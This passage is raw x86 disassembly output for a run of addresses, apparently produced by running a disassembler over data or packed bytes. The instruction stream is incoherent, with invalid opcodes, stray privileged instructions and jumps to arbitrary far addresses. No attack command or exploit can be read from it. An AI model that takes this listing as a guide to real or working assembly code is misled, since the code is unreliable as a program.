  40a436:	int3   
  40a437:	push   edi
  40a438:	and    al,0x9c
  40a43a:	add    BYTE PTR [ecx],bl
  40a43c:	into   
  40a43d:	xchg   ebp,eax
  40a43e:	sub    BYTE PTR [edx],al
  40a440:	jp     0x40a428
  40a442:	out    dx,al
  40a443:	imul   eax,DWORD PTR [ecx],0x5a4a4701
  40a449:	inc    ecx
  40a44a:	add    al,al
  40a44c:	mov    WORD PTR [esi],?
  40a44e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a44f:	jp     0x40a43d
  40a451:	lods   al,BYTE PTR ds:[esi]
  40a452:	push   esi
  40a453:	xor    al,0xd6
  40a455:	icebp  
  40a456:	or     BYTE PTR [ecx],0xb1
  40a459:	xor    esi,eax
  40a45b:	test   DWORD PTR [edi-0x54],esi
  40a45e:	int    0x1b
  40a460:	int    0x20
  40a462:	loope  0x40a499
  40a464:	imul   edx,ecx,0xcdfac5b6
  40a46a:	jmp    0x3cdf70c1
  40a46f:	repz xchg ebp,eax
  40a471:	mov    edi,0x6cfe6037
  40a476:	stos   DWORD PTR es:[edi],eax
  40a477:	sbb    cl,BYTE PTR [ecx-0x7d23090f]
  40a47d:	repz enter 0x34e9,0x48
  40a482:	inc    ebp
  40a483:	into   
  40a484:	ins    DWORD PTR es:[edi],dx
  40a485:	pushf  
  40a486:	dec    ecx
  40a487:	in     al,0xca
  40a489:	in     al,0x97
  40a48b:	sahf   
  40a48c:	das    
  40a48d:	shl    DWORD PTR [eax-0x5d],0x3f
  40a491:	and    eax,0x3b6dc695
  40a496:	pop    esi
  40a497:	mov    eax,edi
  40a499:	popf   
  40a49a:	adc    ah,BYTE PTR [ebx]
  40a49c:	sub    DWORD PTR [ecx-0x2604e5da],esp
  40a4a2:	pop    eax
  40a4a3:	lods   eax,DWORD PTR ds:[esi]
  40a4a4:	pop    edx
  40a4a5:	popa   
  40a4a6:	fiadd  DWORD PTR [edx]
  40a4a8:	loopne 0x40a4dc
  40a4aa:	aam    0x9c
  40a4ac:	xchg   ebp,eax
  40a4ad:	cdq    
  40a4ae:	retf   
  40a4af:	sub    eax,0x21ab8fc1
  40a4b4:	daa    
  40a4b5:	lods   eax,DWORD PTR ds:[esi]
  40a4b6:	icebp  
  40a4b7:	fld    TBYTE PTR [edi+0x2]
  40a4ba:	(bad)  
  40a4bb:	aam    0x86
  40a4bd:	jns    0x40a49b
  40a4bf:	dec    esi
  40a4c0:	adc    bh,BYTE PTR [ebx+0x68]
  40a4c3:	arpl   WORD PTR [edi],di
  40a4c5:	hlt    
  40a4c6:	cmp    DWORD PTR [esi],edx
  40a4c8:	push   eax
  40a4c9:	inc    edx
  40a4ca:	jmp    0x63f7:0x35ce6876
  40a4d1:	push   edi
  40a4d2:	bound  edx,QWORD PTR [esi-0x30]
  40a4d5:	into   
  40a4d6:	inc    ecx
  40a4d7:	shl    BYTE PTR [edi-0x624160de],0xce
  40a4de:	pop    ebp
  40a4df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4e0:	xor    eax,0xb40482e0
  40a4e5:	test   dh,bl
  40a4e7:	xor    BYTE PTR [eax+0x5f62a426],bl
  40a4ed:	push   cs
  40a4ee:	icebp  
  40a4ef:	out    dx,eax
  40a4f0:	sub    bl,bl
  40a4f2:	call   0x330a:0x76ae26db
  40a4f9:	push   es
  40a4fa:	and    eax,0xb14b6a
  40a4ff:	jns    0x40a528
  40a501:	jo     0x40a51d
  40a503:	cmc    
  40a504:	xchg   BYTE PTR [eax],bh
  40a506:	push   ds
  40a507:	mov    eax,0x297d55fc
  40a50c:	push   0x5a
  40a50e:	mov    eax,0x47b957f2
  40a513:	mov    ebx,0xd396abc4
  40a518:	imul   edi,esp,0x14c76d06
  40a51e:	mov    ch,0xfb
  40a520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a521:	arpl   sp,di
  40a523:	int    0x5a
  40a525:	rol    DWORD PTR [ebp+eax*1-0x419f1912],0x35
  40a52d:	out    0xae,al
  40a52f:	mov    edi,0x3aa7318b
  40a534:	inc    ebp
  40a535:	mov    dh,0x4f
  40a537:	jne    0x40a59a
  40a539:	mov    bh,0xe0
  40a53b:	sbb    al,0xb0
  40a53d:	add    BYTE PTR [ecx+0x2fcae7de],0x2e
  40a544:	jle    0x40a4c6
  40a546:	sbb    dl,al
  40a548:	cld    
  40a549:	dec    esp
  40a54a:	shr    DWORD PTR [edi-0x2a],cl
  40a54d:	loopne 0x40a4f1
  40a54f:	sbb    bh,BYTE PTR [ecx-0x1fd8134b]
  40a555:	push   ss
  40a556:	sbb    al,0xc
  40a558:	pushf  
  40a559:	push   esp
  40a55a:	inc    ecx
  40a55b:	imul   ecx,edi,0xffffffdf
  40a55e:	push   edx
  40a55f:	xor    DWORD PTR [ebp+0x5321ff6f],0xf26c4f20
  40a569:	xor    DWORD PTR [ecx+0x5ac4ed85],esp
  40a56f:	dec    ebp
  40a570:	cmc    
  40a571:	mov    ah,0x72
  40a573:	push   ds
  40a574:	jg     0x40a535
  40a576:	in     eax,dx
  40a577:	stc    
  40a578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a579:	or     eax,0x1517383c
  40a57e:	aam    0x63
  40a580:	(bad)  
  40a582:	push   ecx
  40a583:	mov    dh,0xe8
  40a585:	dec    ebp
  40a586:	inc    edx
  40a587:	retf   
  40a588:	jmp    0xb0542003
  40a58d:	jmp    0x40a566
  40a58f:	adc    eax,0x75ab9bbd
  40a594:	mov    ?,WORD PTR [edx]
  40a596:	call   FWORD PTR [edi-0x11e65cc0]
  40a59c:	mov    edi,0xcc0d0675
  40a5a1:	ja     0x40a523
  40a5a3:	popa   
  40a5a4:	jge    0x40a60f
  40a5a6:	mov    ds:0x94ff525d,al
  40a5ab:	jo     0x40a58c
  40a5ad:	or     al,0x71
  40a5af:	sub    al,0xd6
  40a5b1:	out    0x97,eax
  40a5b3:	ss dec edx
  40a5b5:	adc    ah,al
  40a5b7:	add    eax,0x941758a5
  40a5bc:	(bad)  
  40a5bd:	enter  0xfd1,0xe7
  40a5c1:	cmp    BYTE PTR [ebp+ebp*4-0x76663857],cl
  40a5c8:	test   eax,0xcccafd4c
  40a5cd:	push   ds
  40a5ce:	mov    eax,ds:0xfa183d36
  40a5d3:	push   ss
  40a5d4:	inc    ebp
  40a5d5:	dec    ecx
  40a5d6:	mov    edi,0xfc9cfbaa
  40a5db:	push   ss
  40a5dc:	add    BYTE PTR [edi+0x1b5e3605],bh
  40a5e2:	dec    ecx
  40a5e3:	pusha  
  40a5e4:	xor    DWORD PTR [ebx],ebp
  40a5e6:	mov    ebp,DWORD PTR [esi-0x38]
  40a5e9:	imul   esp,ebp,0x5bfa9da8
  40a5ef:	outs   dx,BYTE PTR ds:[esi]
  40a5f0:	dec    ebx
  40a5f1:	test   ebp,0x16b2e3fe
  40a5f7:	and    ebp,DWORD PTR [esi-0x7c1bd149]
  40a5fd:	imul   esp,DWORD PTR [edx],0xfec3ae24
  40a603:	push   ds
  40a604:	cwde   
  40a605:	(bad)  
  40a606:	lahf   
  40a607:	enter  0x3a94,0x2c
  40a60b:	fsubr  DWORD PTR [eax-0x6a]
  40a60e:	push   0x20
  40a610:	sbb    cl,ch
  40a612:	test   BYTE PTR [esi],bl
  40a614:	mov    edx,0xda08a897
  40a619:	cli    
  40a61a:	jp     0x40a5f1
  40a61c:	ins    BYTE PTR es:[edi],dx
  40a61d:	cmp    cl,ah
  40a61f:	inc    edi
  40a620:	jnp    0x40a692
  40a622:	sub    al,0x62
  40a624:	lds    esp,FWORD PTR [edx]
  40a626:	mov    edi,0xb744b996
  40a62b:	ins    DWORD PTR es:[edi],dx
  40a62c:	push   edx
  40a62d:	(bad)  
  40a62e:	adc    al,0xfe
  40a630:	stc    
  40a631:	adc    bl,cl
  40a633:	xlat   BYTE PTR ds:[ebx]
  40a634:	push   ebx
  40a635:	push   edx
  40a636:	or     esp,DWORD PTR [ebp+eax*2+0x39]
  40a63a:	mov    edi,0x7c6f20ea
  40a63f:	aam    0x6f
  40a641:	add    BYTE PTR [esi+0x2e],bl
  40a644:	fmul   QWORD PTR [edi+0x7a]
  40a647:	js     0x40a5f5
  40a649:	dec    edi
  40a64a:	jecxz  0x40a5d7
  40a64c:	mov    al,ds:0x71f2ba8
  40a651:	dec    ebp
  40a652:	pop    edi
  40a653:	dec    eax
  40a654:	sbb    DWORD PTR [edx-0x18],edx
  40a657:	into   
  40a658:	inc    ecx
  40a659:	mov    cl,0xc1
  40a65b:	in     eax,0x92
  40a65d:	pop    ebx
  40a65e:	inc    edx
  40a65f:	sbb    eax,0x96423612
  40a664:	shl    ebx,1
  40a666:	aad    0xd7
  40a668:	int3   
  40a669:	retf   
  40a66a:	mov    edx,0x7bc963cd
  40a66f:	lea    esp,[ebx]
  40a671:	mov    edx,ecx
  40a673:	imul   ecx,DWORD PTR [ebp-0x16],0x15
  40a677:	sbb    al,0x4e
  40a679:	scas   eax,DWORD PTR es:[edi]
  40a67a:	repz ss aam 0x47
  40a67e:	aaa    
  40a67f:	mov    al,ds:0xaca78137
  40a684:	pop    esp
  40a685:	rcl    BYTE PTR [ebx],0xa3
  40a688:	mov    ds:0x1fc87fe4,eax
  40a68d:	inc    edx
  40a68e:	push   es
  40a68f:	lea    ebp,[esi+0x3232335b]
  40a695:	or     edx,DWORD PTR [edx-0x6c]
  40a698:	or     esi,DWORD PTR [ebx-0x27]
  40a69b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a69c:	ss aad 0x12
  40a69f:	out    dx,eax
  40a6a0:	cmc    
  40a6a1:	add    eax,0x28b3f1b8
  40a6a6:	sub    esp,DWORD PTR [eax+0x58d7efe4]
  40a6ac:	pop    esi
  40a6ad:	jb     0x40a6f7
  40a6af:	sub    ah,BYTE PTR [edx]
  40a6b1:	aad    0x7c
  40a6b3:	retf   
  40a6b4:	mov    ch,0x4e
  40a6b6:	mov    cl,0x29
  40a6b8:	sahf   
  40a6b9:	dec    eax
  40a6ba:	dec    edi
  40a6bb:	mov    ds:0x2de4a9df,eax
  40a6c0:	inc    eax
  40a6c1:	mov    dh,0x8d
  40a6c3:	pop    ss
  40a6c4:	daa    
  40a6c5:	fucom  st(3)
  40a6c7:	in     al,0x76
  40a6c9:	and    eax,0x4ee7456c
  40a6ce:	test   ecx,edi
  40a6d0:	lahf   
  40a6d1:	fst    DWORD PTR ds:0x5ef92a98
  40a6d7:	addr16 pop eax
  40a6d9:	test   al,0x3f
  40a6db:	add    eax,edi
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x23]
  40a6ef:	int3   
  40a6f0:	push   cs
  40a6f1:	sar    BYTE PTR [eax-0x17],0x7e
  40a6f5:	jle    0x40a771
  40a6f7:	jge    0x40a777
  40a6f9:	jle    0x40a729
  40a6fb:	jecxz  0x40a747
  40a6fd:	loopne 0x40a73b
  40a6ff:	lds    ebp,FWORD PTR [edx]
  40a701:	shl    BYTE PTR [esi+eiz*2],1
  40a704:	adc    BYTE PTR [edx-0x11b61668],0xae
  40a70b:	adc    BYTE PTR [esi-0x1a8d1e67],ch
  40a711:	int    0x6c
  40a713:	fstp   TBYTE PTR [esi+0x6c]
  40a716:	mov    ebx,?
  40a718:	adc    dl,BYTE PTR [edx+0x98317c2]
  40a71e:	cmp    BYTE PTR [eax-0x65],cl
  40a721:	and    cl,BYTE PTR [ebx-0x431f2b5f]
  40a727:	xchg   ebp,eax
  40a728:	pop    ebx
  40a729:	dec    edx
  40a72a:	mov    cl,0xd9
  40a72c:	and    al,0xf6
  40a72e:	mov    esp,0x4f004ac2
  40a733:	sbb    BYTE PTR [edx],dh
  40a735:	xor    dl,ch
  40a737:	test   DWORD PTR [eax+0x76],edx
  40a73a:	and    al,0xe9
  40a73c:	(bad)  [edi-0xa]
  40a73f:	mov    bl,0xc6
  40a741:	fs mov esp,0x14fafbaf
  40a747:	ret    
  40a748:	xchg   esp,eax
  40a749:	clc    
  40a74a:	lods   eax,DWORD PTR ds:[esi]
  40a74b:	adc    al,0x13
  40a74d:	int    0xcd
  40a74f:	bound  esp,QWORD PTR [eax+0x2583724a]
  40a755:	cmp    BYTE PTR [ecx+0xb],bl
  40a758:	ss dec ecx
  40a75a:	mov    eax,DWORD PTR [eax]
  40a75c:	mov    ebx,0xa3d40692
  40a761:	and    DWORD PTR [edx],ebx
  40a763:	fdivr  QWORD PTR [eax]
  40a765:	mov    edx,0xe6fe8ed5
  40a76a:	hlt    
  40a76b:	push   cs
  40a76c:	mov    edx,0x1b42207d
  40a771:	ins    BYTE PTR es:[edi],dx
  40a772:	push   ecx
  40a773:	cmc    
  40a774:	jbe    0x40a72e
  40a776:	ret    0x721f
  40a779:	xchg   esp,eax
  40a77a:	pop    ecx
  40a77b:	inc    ecx
  40a77c:	daa    
  40a77d:	inc    ecx
  40a77e:	shr    bh,cl
  40a780:	cmp    eax,0x68cf0254
  40a785:	lahf   
  40a786:	add    DWORD PTR [ecx-0xe91410e],ebp
  40a78c:	fwait
  40a78d:	in     al,0x28
  40a78f:	mov    ebx,0xcff1ea4e
  40a794:	mov    ah,0xea
  40a796:	pop    esp
  40a797:	dec    DWORD PTR ds:0x7856cd8f
  40a79d:	inc    ebx
  40a79e:	cmp    dh,dl
  40a7a0:	jmp    0x5d5c:0xdb57183c
  40a7a7:	add    edx,DWORD PTR [ebx-0xd8067ba]
  40a7ad:	xchg   DWORD PTR ds:0xf7f7f6a5,esi
  40a7b3:	ins    DWORD PTR es:[edi],dx
  40a7b4:	and    ah,BYTE PTR [ebx-0x1c]
  40a7b7:	xchg   BYTE PTR [ebx+ecx*4],dl
  40a7ba:	mov    ecx,0x6eeefda1
  40a7bf:	mov    cl,0xbb
  40a7c1:	jp     0x40a745
  40a7c3:	fucom  st(1)
  40a7c5:	aas    
  40a7c6:	mov    bl,0x5
  40a7c8:	xor    al,0x25
  40a7ca:	and    eax,0x7e887094
  40a7cf:	mov    ecx,0x4cecf99a
  40a7d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d5:	in     eax,0x80
  40a7d7:	mov    gs,WORD PTR [ebx+esi*4+0x54e3bf74]
  40a7de:	dec    eax
  40a7df:	mov    BYTE PTR [esi+0x53517db],0x91
  40a7e6:	cwde   
  40a7e7:	and    al,0x41
  40a7e9:	mov    ecx,0x5d6e48ca
  40a7ee:	vpunpckhwd xmm7,xmm2,xmm3
  40a7f2:	gs in  eax,dx
  40a7f4:	les    edi,FWORD PTR [ebp+0x12]
  40a7f7:	mov    WORD PTR [eax],?
  40a7f9:	add    al,0x61
  40a7fb:	mov    dh,0x4f
  40a7fd:	jge    0x40a844
  40a7ff:	ror    BYTE PTR [esi-0x3eab952a],0xba
  40a806:	or     al,0x78
  40a808:	mov    ch,0xdc
  40a80a:	and    al,BYTE PTR [eax]
  40a80c:	sbb    eax,0x918bd912
  40a811:	xlat   BYTE PTR ds:[ebx]
  40a812:	nop
  40a813:	test   DWORD PTR [edx+0x22],0x38bbe3a1
  40a81a:	pop    edx
  40a81b:	push   0xffffff81
  40a81d:	jmp    0x40a802
  40a81f:	mov    ds:0x39b4040a,al
  40a824:	mov    fs,ebx
  40a826:	mov    ah,0x40
  40a828:	es pop edi
  40a82a:	mov    ebx,0x1d14a6f8
  40a82f:	add    BYTE PTR [edx+esi*4-0x6e70bf50],bh
  40a836:	fst    DWORD PTR [esi+0x5c]
  40a839:	rcl    BYTE PTR [eax+edx*1+0x32],cl
  40a83d:	cmp    eax,0x7a5f264a
  40a842:	mov    bl,0x8d
  40a844:	mov    dl,0x20
  40a846:	xlat   BYTE PTR ds:[ebx]
  40a847:	imul   edx,ebx,0x3f8e8192
  40a84d:	pop    eax
  40a84e:	cmc    
  40a84f:	jmp    0x40a7de
  40a851:	sub    eax,ecx
  40a853:	mov    al,0xe9
  40a855:	aaa    
  40a856:	mov    bl,0x42
  40a858:	mov    eax,ds:0xc7ef067b
  40a85d:	mov    edx,0xde9e7bc
  40a862:	sbb    DWORD PTR [esi+0x22],0xffffff8b
  40a866:	or     al,0x7f
  40a868:	sbb    DWORD PTR [ecx-0x3341de44],ecx
  40a86e:	jg     0x40a8bb
  40a870:	push   edi
  40a871:	or     edi,0x5f
  40a874:	call   DWORD PTR [eax]
  40a876:	outs   dx,DWORD PTR ds:[esi]
  40a877:	inc    esp
  40a878:	adc    al,0x0
  40a87a:	sar    al,cl
  40a87c:	inc    ebx
  40a87d:	call   0xf2729677
  40a882:	jns    0x40a8f4
  40a884:	mov    WORD PTR [edx],?
  40a886:	cdq    
  40a887:	cmp    dl,cl
  40a889:	test   BYTE PTR [ecx-0x7fe0b2ad],dh
  40a88f:	push   esp
  40a890:	fxch   st(2)
  40a892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a893:	das    
  40a894:	jl     0x40a8ef
  40a896:	mov    bl,0x74
  40a898:	(bad)  
  40a899:	in     al,dx
  40a89a:	hlt    
  40a89b:	ds (bad) 
  40a89d:	jnp    0x40a8cf
  40a89f:	xchg   esi,eax
  40a8a0:	xchg   ebx,eax
  40a8a1:	scas   al,BYTE PTR es:[edi]
  40a8a2:	xchg   ecx,eax
  40a8a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a4:	and    DWORD PTR [ebx],ebp
  40a8a6:	lea    esi,ds:0x476cf13d
  40a8ac:	loopne 0x40a8cd
  40a8ae:	dec    ecx
  40a8af:	mov    ds:0x69cbf5ee,al
  40a8b4:	and    al,0x38
  40a8b6:	dec    esp
  40a8b7:	call   0xf0f42e8f
  40a8bc:	xor    ah,BYTE PTR [ebp+0x2b7de18c]
  40a8c2:	int3   
  40a8c3:	imul   ebp,DWORD PTR [edx-0x5],0x7eec8384
  40a8ca:	retf   0x5605
  40a8cd:	pop    edx
  40a8ce:	icebp  
  40a8cf:	jmp    0x40a8d3
  40a8d1:	xor    eax,0x9a120924
  40a8d6:	mov    BYTE PTR [edx+0xe4c7398],dl
  40a8dc:	mov    dh,0x3e
  40a8de:	imul   ebx,DWORD PTR [eax+eiz*1-0x55fc2d09],0xc3731c69
  40a8e9:	enter  0x1694,0x2f
  40a8ed:	sub    al,0x90
  40a8ef:	add    cl,bl
  40a8f1:	scas   al,BYTE PTR es:[edi]
  40a8f2:	in     al,0x68
  40a8f4:	push   ebp
  40a8f5:	in     eax,dx
  40a8f6:	mov    eax,ds:0x409c165e
  40a8fb:	adc    esp,DWORD PTR [edx]
  40a8fd:	fld    QWORD PTR ds:0xcff01a89
  40a903:	jae    0x40a93f
  40a905:	xchg   esp,eax
  40a906:	or     al,0xb2
  40a908:	mov    esp,0x63839941
  40a90d:	lods   eax,DWORD PTR ds:[esi]
  40a90e:	in     eax,0xb4
  40a910:	lods   eax,DWORD PTR ds:[esi]
  40a911:	or     DWORD PTR [eax],0x68
  40a914:	mov    edi,0x5a23741f
  40a919:	repz sbb cl,bh
  40a91c:	jge    0x40a942
  40a91e:	leave  
  40a91f:	jns    0x40a8b6
  40a921:	call   0x7a7bf36f
  40a926:	sbb    BYTE PTR [ecx],0xde
  40a929:	xor    bl,BYTE PTR [edi]
  40a92b:	inc    esi
  40a92c:	sub    eax,0xe7ba442a
  40a931:	sar    BYTE PTR [esi+0x291efa98],1
  40a937:	cli    
  40a938:	mov    bh,BYTE PTR [ecx]
  40a93a:	dec    edx
  40a93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a93c:	out    dx,al
  40a93d:	pop    esi
  40a93e:	(bad)
  40a941:	das    
  40a942:	jecxz  0x40a9bf
  40a944:	cdq    
  40a945:	inc    ecx
  40a946:	xchg   ecx,eax
  40a947:	outs   dx,BYTE PTR ds:[esi]
  40a948:	stos   BYTE PTR es:[edi],al
  40a949:	lahf   
  40a94a:	or     ecx,DWORD PTR [edx-0x6688ab60]
  40a950:	lock repz popa 
  40a953:	arpl   WORD PTR [edx-0x7a],di
  40a956:	loope  0x40a93f
  40a958:	lds    edi,FWORD PTR [edx-0x3c04cdae]
  40a95e:	mov    ds:0xd9767b76,al
  40a963:	or     al,0x7e
  40a965:	adc    DWORD PTR [esi],0x6f
  40a968:	xor    BYTE PTR [ebp+0x8],bh
  40a96b:	fs jb  0x40a952
  40a96e:	aas    
  40a96f:	and    al,0xff
  40a971:	imul   edi,DWORD PTR [ecx+ecx*2+0x76],0xffffffaa
  40a976:	inc    ecx
  40a977:	pop    esp
  40a978:	(bad)  
  40a979:	in     al,dx
  40a97a:	outs   dx,DWORD PTR ds:[esi]
  40a97b:	mul    esi
  40a97d:	mov    BYTE PTR [edx-0x31d60cd7],dl
  40a983:	inc    ecx
  40a984:	and    eax,0xa0f1726c
  40a989:	daa    
  40a98a:	push   ds
  40a98b:	fadd   QWORD PTR [ecx+esi*8-0x15]
  40a98f:	mov    al,ds:0x91bc410f
  40a994:	imul   DWORD PTR [ebx]
  40a996:	sbb    DWORD PTR [eax+edx*2+0x5dc4db13],eax
  40a99d:	and    al,0xd8
  40a99f:	push   ebx
  40a9a0:	dec    edx
  40a9a1:	add    DWORD PTR [eax-0x58],esp
  40a9a4:	mov    edi,0xa8e3d769
  40a9a9:	cli    
  40a9aa:	fs out 0xd4,eax
  40a9ad:	or     al,BYTE PTR [ebx-0x77]
  40a9b0:	and    ch,BYTE PTR [ebx-0x8]
  40a9b3:	pushf  
  40a9b4:	fs inc esp
  40a9b6:	vminsd xmm0,xmm4,QWORD PTR [ebx+0x2c886351]
  40a9be:	loop   0x40a98a
  40a9c0:	cld    
  40a9c1:	mov    es,WORD PTR [ebp+0x1]
  40a9c4:	pop    ebp
  40a9c5:	mov    ebp,0x9f31ab46
  40a9ca:	fsubr  DWORD PTR [esp+edi*1+0x5d66c5c0]
  40a9d1:	popf   
  40a9d2:	cld    
  40a9d3:	sbb    DWORD PTR [ebx],ebx
  40a9d5:	add    dl,bh
  40a9d7:	jne    0x40a9b0
  40a9d9:	add    DWORD PTR [ecx-0x52],esi
  40a9dc:	shl    BYTE PTR [edi-0x20a29f9],1
  40a9e2:	jae    0x40a9df
  40a9e4:	jge    0x40aa2e
  40a9e6:	ror    BYTE PTR [esi-0x76],1
  40a9e9:	pop    ecx
  40a9ea:	push   edi
  40a9eb:	pop    ebx
  40a9ec:	jo     0x40a9c9
  40a9ee:	lods   al,BYTE PTR fs:[si]
  40a9f1:	ror    ch,cl
  40a9f3:	sub    DWORD PTR [eax],edx
  40a9f5:	mov    esi,0x4e50768c
  40a9fa:	arpl   dx,dx
  40a9fc:	or     edi,DWORD PTR gs:[ecx]
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [edi+ecx*1-0xbfb5195],esi
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	add    ebp,DWORD PTR [esp+ebx*1+0x6b]
  40aa39:	push   esi
  40aa3a:	test   eax,0x79b17cf9
  40aa3f:	jmp    0x40a9d6
  40aa41:	xlat   BYTE PTR ds:[ebx]
  40aa42:	jbe    0x40aa20
  40aa44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa45:	adc    eax,0x8db54b6b
  40aa4a:	add    DWORD PTR [ecx-0x2f],edi
  40aa4d:	push   ecx
  40aa4e:	(bad)  
  40aa4f:	(bad)  
  40aa50:	cld    
  40aa51:	mov    ds:0x22381ca,eax
  40aa56:	aad    0xa5
  40aa58:	xchg   ebp,eax
  40aa59:	adc    BYTE PTR [esi-0x1a8c7c4a],dl
  40aa5f:	sbb    dl,BYTE PTR [ecx-0x63]
  40aa62:	scas   eax,DWORD PTR es:[edi]
  40aa63:	jnp    0x40aa1a
  40aa65:	xor    DWORD PTR [edx-0x3055256c],ebx
  40aa6b:	mov    esi,0x2bbffde
  40aa70:	pop    ds
  40aa71:	xchg   BYTE PTR [eax],ch
  40aa73:	fs fprem1 
  40aa76:	dec    esi
  40aa77:	bound  ebx,QWORD PTR [ebp-0x7f]
  40aa7a:	pop    esi
  40aa7b:	push   eax
  40aa7c:	fnstenv [esi+0x64]
  40aa7f:	push   cs
  40aa80:	pop    edx
  40aa81:	pop    edi
  40aa82:	add    ebx,DWORD PTR [ebx]
  40aa84:	jne    0x40aa1b
  40aa86:	pop    edx
  40aa87:	sbb    DWORD PTR [ebp+0x199e07d1],ebp
  40aa8d:	es dec ebp
  40aa8f:	test   BYTE PTR [ebx+0x2300895f],0x45
  40aa96:	ja     0x40aa3d
  40aa98:	inc    ebp
  40aa99:	xchg   edx,eax
  40aa9a:	loop   0x40aa60
  40aa9c:	jae    0x40aad5
  40aa9e:	dec    ebx
  40aa9f:	and    ah,BYTE PTR [edi+0x24e85641]
  40aaa5:	call   0x7599:0xbd7db290
  40aaac:	xchg   ebp,eax
  40aaad:	aaa    
  40aaae:	mov    ds:0xf530ebba,eax
  40aab3:	jp     0x40ab25
  40aab5:	in     eax,dx
  40aab6:	or     eax,0x297e59ef
  40aabb:	mov    edx,DWORD PTR [edx+0x2c162f04]
  40aac1:	jnp    0x40aa97
  40aac3:	add    BYTE PTR [edx],ah
  40aac5:	or     ch,al
  40aac7:	dec    ecx
  40aac8:	sti    
  40aac9:	mov    ecx,0xf8228a55
  40aace:	xor    ecx,esp
  40aad0:	scas   al,BYTE PTR es:[edi]
  40aad1:	fstp   DWORD PTR [edx-0x5a]
  40aad4:	neg    dl
  40aad6:	xor    al,0xef
  40aad8:	int    0xa7
  40aada:	repnz daa 
  40aadc:	sub    esp,DWORD PTR [eax-0x38]
  40aadf:	jb     0x40ab58
  40aae1:	pusha  
  40aae2:	mov    dh,0xab
  40aae4:	cmp    eax,0x7b53dc5c
  40aae9:	fdivr  DWORD PTR [esi+0x44d9fc84]
  40aaef:	push   DWORD PTR [esi+ebp*4]
  40aaf2:	mov    DWORD PTR [esp+esi*1-0x67],ecx
  40aaf6:	inc    ebp
  40aaf7:	ins    BYTE PTR es:[edi],dx
  40aaf8:	cmp    DWORD PTR [edi+0x4d],ecx
  40aafb:	or     eax,DWORD PTR [esi-0x33]
  40aafe:	inc    eax
  40aaff:	fnsave [ebx-0x1a11e8ce]
  40ab05:	mov    eax,0x38d4a4b9
  40ab0a:	xor    edi,0x7b
  40ab0d:	jecxz  0x40aaaf
  40ab0f:	push   ecx
  40ab10:	mov    BYTE PTR [ebx-0x4e],bh
  40ab13:	(bad)  
  40ab14:	in     al,0xa5
  40ab16:	pop    eax
  40ab17:	pop    ecx
  40ab18:	mov    ebp,0x9b533eb1
  40ab1d:	add    dl,bl
  40ab1f:	jmp    0xc681:0x7d4f7087
  40ab26:	mov    esp,DWORD PTR [edi+0x408f5438]
  40ab2c:	es hlt 
  40ab2e:	lods   eax,DWORD PTR ds:[esi]
  40ab2f:	cmp    BYTE PTR [ebx],dl
  40ab31:	cld    
  40ab32:	dec    eax
  40ab33:	(bad)  
  40ab34:	pop    edx
  40ab35:	stos   BYTE PTR es:[edi],al
  40ab36:	mov    esp,0xa18f2985
  40ab3b:	xor    ebx,DWORD PTR cs:[esi+edi*2+0x2d]
  40ab40:	rcl    BYTE PTR cs:[ebx],1
  40ab43:	mov    esi,0xa2bd684e
  40ab48:	push   esi
  40ab49:	xor    ebx,DWORD PTR [ebx]
  40ab4b:	xor    BYTE PTR [esi],cl
  40ab4d:	inc    ebp
  40ab4e:	pop    ss
  40ab4f:	enter  0x9e34,0xe9
  40ab53:	cdq    
  40ab54:	push   esi
  40ab55:	ret    
  40ab56:	outs   dx,BYTE PTR ds:[esi]
  40ab57:	js     0x40ab32
  40ab59:	mov    dl,0x25
  40ab5b:	outs   dx,BYTE PTR ds:[esi]
  40ab5c:	ror    DWORD PTR [ecx],0x71
  40ab5f:	icebp  
  40ab60:	add    eax,0x8258015f
  40ab65:	imul   edx,DWORD PTR ds:0x122e8a70,0x7d725eba
  40ab6f:	adc    al,0x32
  40ab71:	jmp    0x40ab1c
  40ab73:	daa    
  40ab74:	push   cs
  40ab75:	mov    al,0xc6
  40ab77:	aas    
  40ab78:	xchg   DWORD PTR [esi+0x778d4da1],ecx
  40ab7e:	and    al,dl
  40ab80:	test   al,0xe9
  40ab82:	gs push esi
  40ab84:	mov    dh,0x7f
  40ab86:	sbb    ebx,DWORD PTR [ebx+0x20544dec]
  40ab8c:	inc    esi
  40ab8d:	or     eax,0x1081eedc
  40ab92:	inc    ebx
  40ab93:	pop    ebp
  40ab94:	test   al,0x5c
  40ab96:	pop    ebx
  40ab97:	sub    al,0xd9
  40ab99:	sub    eax,DWORD PTR [edx-0x25]
  40ab9c:	mov    dh,0x77
  40ab9e:	jp     0x40ab5d
  40aba0:	sahf   
  40aba1:	push   cs
  40aba2:	mov    eax,0x2701b5d2
  40aba7:	jp     0x40ab80
  40aba9:	push   ebp
  40abaa:	je     0x40ab3e
  40abac:	inc    esi
  40abad:	pusha  
  40abae:	daa    
  40abaf:	stos   BYTE PTR es:[edi],al
  40abb0:	and    edi,eax
  40abb2:	and    BYTE PTR [edi-0x3345799],0xa4
